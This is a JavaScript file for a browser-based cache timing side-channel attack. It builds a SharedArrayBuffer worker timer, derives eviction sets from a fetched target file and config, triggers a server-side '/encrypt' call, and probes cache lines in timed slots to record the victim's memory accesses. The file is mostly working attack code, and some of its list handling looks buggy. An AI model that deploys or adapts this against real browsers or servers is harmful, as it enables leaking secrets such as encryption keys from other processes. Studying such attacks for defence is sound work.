const CACHE_LINE_SIZE = 64
const CACHE_ASSOCIATIVITY = 16
const sab = new Uint32Array(new SharedArrayBuffer(8))

async function getTargetArrayBuffer() {
  const response = await fetch("/target_file")
  return response.arrayBuffer()
}

async function getConfig() {
  const response = await fetch("/config")
  const configString = await response.text()
  const config = {
    threshold: 0,
    wait_cycles: 0,
    time_slots: 0 ,
    time_slot_size: 0, 
    target_file: "",
    probe: []
  }
  const lines = configString.split('\n');
  for(let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if(line.length == 0) continue
    const [key, value] = line.split(' ')
    if(key == "probe") {
      config.probe.push(Number(value))
    } else if(key == "target_file") {
      config.target_file = value
    } else {
      config[key] = Number(value)
    }
  }
  return config
}

function initializeTimer(cb) {

  if(window.Worker) {
    sab[0] = 0
    console.log("initializing worker")
    const worker = new Worker("counter.js");

    worker.onmessage = (event) => {
      console.log(event.data)
      cb()
    }
    worker.postMessage(sab)
  } else {
    console.log("web worker not available")
  }
}

function getTime() {
  return sab[0]
}

class List {
  next = null;
  prev = null;
  index;
  size = 0;
  randomIndex = 0;
  constructor(index) {
    this.index = index
    this.size++;
  }
  static copy(list) {
    const n = new List(list.index);
    return n;
  }
  static add(index, list) {
    let newNode;
    if(typeof(index) === "number") {
      newNode = new List(index);
    } else {
      newNode = index;
    }
    if(Boolean(list)) {
      list.next = newNode
      if(newNode) {
        newNode.prev = list;
        newNode.size = list.size;
      }
    } else {
      list = newNode
    }
    list.size++;
    return list
  }
  static next(list) {
    if(!list) return null
    return list.next;
  }
  static getIndex(list, index) {
    for(let i = 0; i < index && list; i++) {
      list = List.next(list)
    }
    return list
  }
  static getRandomIndex(list) {
    // return Math.round(Math.random() * (list.size - 1))
    return list.randomIndex++ % list.size;
  }
  static filter(list, func) {
    let result = null;
    for(; list; list = List.next(list)) {
      if(func(list)) {
        result = List.add(List.copy(list), result);
      }
    }
    return result;
  }
  static union(list1, list2) {
    let result = null;
    for(let list1c = list1; list1c; list1c = List.next(list1c)) {
      result = List.add(result, List.copy(list1c));
    }
    for(let list2c = list2; list2c; list2c = List.next(list2c)) {
      result = List.add(result, List.copy(list2c));
    }
    return result
  }
  static isValidEvictionSet(evictionSet, target, offset, threshold) {
    evict(target, evictionSet)
    const start = getTime()
    let _ = target[offset]
    const t = getTime() - start;
    return threshold < t
  }
}

function generateCandidateSet() {
  const candidateBuffer = new ArrayBuffer(1000000);
  let list = null;
  for(let i = 0; i < candidateBuffer.byteLength; i+=CACHE_LINE_SIZE) {
    list = List.add(i, list)
  }
  return list
}

function generateEvictionSet(target, offset, candidateSet, threshold) {
  // naive eviction set generation
  let ev = null;

  while(!ev || ev.size < CACHE_ASSOCIATIVITY) {
  
    const randomIndex = List.getRandomIndex(candidateSet)
    const randomOffset = List.getIndex(candidateSet, randomIndex)
    const withoutCandidate = List.filter(candidateSet, (l) => l.index != randomOffset)
    if(List.isValidEvictionSet(List.union(ev, withoutCandidate), target, offset, threshold)) {
      ev = List.add(randomOffset, ev);
      console.log(ev)
    }
    candidateSet = withoutCandidate
  }
  return ev
}

function generateConflictSet(eviction_sets) {
  let union = List.copy(eviction_sets[0]);
  for(let i = 1; i < eviction_sets.length; i++) {
    union = List.union(union, eviction_sets[i])
  }
  return union
}

function evict(target, evictionSet) {
  for(let list = evictionSet; list; list = List.next(list)) {
    let _ = target[list.index]
  }
}

function probe(target, offset) {
  const start = getTime();
  let _ = target[offset]
  return getTime() - start;
}

function wait(n_cycles) {
  for(let i = 0; i < n_cycles; i++) {}
}

function attack() {

  // CLOCK
  initializeTimer(_attack)
}

async function _attack() {

  // TARGET
  const target = await getTargetArrayBuffer();
  const config = await getConfig();

  // GENERATE EVICTION SETS
  console.log("generating candidate set")
  const candidateSet = generateCandidateSet()
  console.log("candidate set:", candidateSet)

  console.log("generating eviction sets")
  const evictionSets = []
  for(let i = 0; i < config.probe.length; i++) {
    evictionSets.push(generateEvictionSet(target, config.probe[i], candidateSet, config.threshold))
  }
  console.log(evictionSets)
  console.log("generating conflict set")
  const conflictSet = generateConflictSet(evictionSets)
  console.log("initiating attack")
  fetch("/encrypt", {method: "POST"})
  const results = new Array(config.time_slots).fill([])
  for(let time_slot = 0; time_slot < config.time_slots; time_slot++) {
    const start = getTime();
    for(let addr = 0; addr < config.probe.length; addr++) {
      const t = probe(target, config.probe[addr]) < config.threshold
      results[time_slot].push(t)
    }
    evict(target, conflictSet)
    while(getTime() - start < config.time_slot_size) {
      wait(config.wait_cycles);
    }
  }
  console.log("attack is done")
}
